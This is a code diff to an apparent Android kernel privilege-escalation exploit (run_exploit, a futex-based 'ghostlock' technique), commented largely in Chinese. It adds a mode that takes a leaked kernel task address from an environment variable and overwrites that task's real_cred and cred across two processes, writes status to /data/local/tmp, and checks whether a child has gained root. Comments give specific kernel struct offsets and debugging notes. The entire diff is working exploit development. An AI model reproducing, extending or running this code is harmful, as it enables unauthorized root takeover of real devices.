@@ -557,11 +557,29 @@ int run_exploit(int argc, char **argv) {
         return 1;
       }
       /* mt33: ghostlock W2 - fork blocked child, leak its task, write its cred */
-      int cred_pipe[2];
-      if (pipe(cred_pipe) != 0) { pr_error("mt33: pipe failed errno=%d\n", errno); return 1; }
-      pid_t cred_child = fork();
-      if (cred_child < 0) { pr_error("mt33: fork failed errno=%d\n", errno); return 1; }
+      /* mt49: PSELECT_TASK=<hex> → 外部模式: 不 fork, 直接写给定 task (双写两阶段
+       * 各跑独立进程, 干净 futex1 树). 教训(crash#2): slide_reset_trigger_state
+       * 不清 v37_* 静态 futex 词, 同进程第二次触发 → rb_insert 在已中毒 waiter 树上
+       * rebalance, 旋转把树指针写进 task+0x770..0x788(ptracer_cred/real_cred/cred,
+       * ptracer_capable@0xffffffc008147b34 实证 0x770=ptracer_cred) → 子进程 poll
+       * 解引用 munmap 后的触发线程栈 → panic. 所以: 一进程一写, RETRY=1. */
+      int cred_pipe[2] = { -1, -1 };
+      pid_t cred_child = -1;
+      char *mt49_task_env = getenv("PSELECT_TASK");
       uintptr_t task = 0;
+      if (mt49_task_env) {
+        task = strtoull(mt49_task_env, NULL, 16);
+        pr_info("mt49: external task=%016zx (no fork, single write this process)\n",
+                (size_t)task);
+        fflush(stdout);
+      } else if (pipe(cred_pipe) != 0) {
+        pr_error("mt33: pipe failed errno=%d\n", errno);
+        return 1;
+      }
+      if (!mt49_task_env) {
+        cred_child = fork();
+        if (cred_child < 0) { pr_error("mt33: fork failed errno=%d\n", errno); return 1; }
+      }
       if (cred_child == 0) {
         close(cred_pipe[0]);
         uintptr_t my_task = perf_find_task();  /* also fills g_perf_cred_cand in child */
@@ -678,6 +696,18 @@ int run_exploit(int argc, char **argv) {
               }
             }
           }
+          /* mt49: 状态发布 — 跨进程双写的桥梁. 阶段R进程 fork 本子进程并写 real_cred;
+           * 阶段C进程读本文件取 task 地址补写 cred. CapEff 来自 real_cred(status 用
+           * __task_cred), euid 来自 cred(getresuid) — 阶段脚本据此判断 R 是否落地. */
+          {
+            int sfd = open("/data/local/tmp/mt49_child_status.txt",
+                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (sfd >= 0) {
+              dprintf(sfd, "task=%016zx uid=%d euid=%d CapEff=%016llx root_seen=%d\n",
+                      (size_t)my_task, ruid, euid, capeff, root_seen);
+              close(sfd);
+            }
+          }
           if (poll_i > 0 && (poll_i % 50) == 0) {  /* 10s 心跳 */
             pr_info("mt47: alive poll=%d uid=%d CapEff=%016llx\n",
                     poll_i, ruid, capeff);
@@ -690,15 +720,17 @@ int run_exploit(int argc, char **argv) {
         fflush(stdout);
         _exit(2);
       }
-      close(cred_pipe[1]);
-      ssize_t rr = read(cred_pipe[0], &task, sizeof(task));
-      ssize_t rr2 = read(cred_pipe[0], &g_perf_cred_cand, sizeof(g_perf_cred_cand));
-      close(cred_pipe[0]);
-      if (rr != (ssize_t)sizeof(task) || !task) {
-        pr_error("mt33: child-task-leak-failed rr=%zd task=%016zx\n", rr, (size_t)task);
-        kill(cred_child, SIGKILL);
-        waitpid(cred_child, NULL, 0);
-        return 1;
+      if (!mt49_task_env) {
+        close(cred_pipe[1]);
+        ssize_t rr = read(cred_pipe[0], &task, sizeof(task));
+        ssize_t rr2 = read(cred_pipe[0], &g_perf_cred_cand, sizeof(g_perf_cred_cand));
+        close(cred_pipe[0]);
+        if (rr != (ssize_t)sizeof(task) || !task) {
+          pr_error("mt33: child-task-leak-failed rr=%zd task=%016zx\n", rr, (size_t)task);
+          kill(cred_child, SIGKILL);
+          waitpid(cred_child, NULL, 0);
+          return 1;
+        }
       }
       if (!task) {
         pr_error("mt28c: perf task leak failed\n");
@@ -706,7 +738,7 @@ int run_exploit(int argc, char **argv) {
       }
       /* mt40: route C - use perf-leaked cred addr, write cred content (real uid@+0x4), not ptr */
       uintptr_t cred_addr = g_perf_cred_cand;
-      if (!cred_addr) {
+      if (!mt49_task_env && !cred_addr) {
         pr_error("mt40: no cred_cand from perf - need PSELECT_PERF_CRED\n");
         kill(cred_child, SIGKILL);
         waitpid(cred_child, NULL, 0);
@@ -818,7 +850,7 @@ int run_exploit(int argc, char **argv) {
          * （旧 FUTEX_WAKE 打在父进程自己栈变量上，fork 后 mm 不同，结构性无效，已删） */
         /* mt47: 子进程 root 后不退出(等 insmod), 父进程改查 marker 文件 */
         int cst2 = 0;
-        if (waitpid(cred_child, &cst2, WNOHANG) == cred_child) {
+        if (cred_child > 0 && waitpid(cred_child, &cst2, WNOHANG) == cred_child) {
           if (WIFEXITED(cst2) && WEXITSTATUS(cst2) == 42) {
             pr_success("mt47: CHILD-ROOT attempt=%d\n", att);
             got_root = 1;
@@ -837,7 +869,7 @@ int run_exploit(int argc, char **argv) {
       /* mt33/mt47: wait for child result (42 = root) or marker */
       int cst = 0;
       for (int i = 0; i < 60; i++) {
-        if (waitpid(cred_child, &cst, WNOHANG) == cred_child) {
+        if (cred_child > 0 && waitpid(cred_child, &cst, WNOHANG) == cred_child) {
           if (WIFEXITED(cst) && WEXITSTATUS(cst) == 42) {
             pr_success("mt47: *** CHILD-ROOT confirmed ***\n");
             got_root = 1;
